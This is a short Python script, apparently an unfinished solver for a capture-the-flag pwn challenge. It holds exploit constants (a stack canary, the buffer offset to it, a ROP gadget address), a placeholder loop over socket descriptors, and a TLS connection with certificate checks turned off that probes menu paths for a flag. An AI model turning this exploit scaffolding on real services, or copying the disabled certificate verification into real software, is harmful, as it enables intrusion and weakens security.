import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40
POP_RBP = 0x40141d

# Try different FD values
# In fork server: parent has listen socket (3), child gets accept socket (4 typically)
# But could be 3, 4, 5 depending on setup

for fd_val in [3, 4, 5, 6]:
    print(f"\n=== Testing FD={fd_val} ===")
    
    # Point RBP so that [rbp-0x14] contains fd_val
    # We need to find where fd_val exists in memory
    # Actually, we can't easily do this without knowing memory layout
    
    # Alternative: what if we don't need to call load_flag at all?
    # What if the flag is already loaded by server init?
    
    pass

# Let me just try navigating normally and see what's in location
raw = socket.create_connection((HOST, PORT), timeout=5)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)

s.sendall(b"4\n")
time.sleep(0.2)
s.sendall(b"test")
time.sleep(0.5)

# Try all paths to see if any show the flag
for path in [(1,), (2,), (3, 1), (3, 2), (4, 1)]:
    print(f"\nTrying path: {path}")
    for choice in path:
        s.sendall(f"{choice}\n".encode())
        time.sleep(0.3)
    
    # Read output
    s.settimeout(1.0)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            output = chunk.decode(errors='replace')
            if "JUL{" in output or "juleCTF{" in output:
                print(f"FOUND FLAG: {output}")
                break
            print(output[:200])
    except:
        pass

s.close()
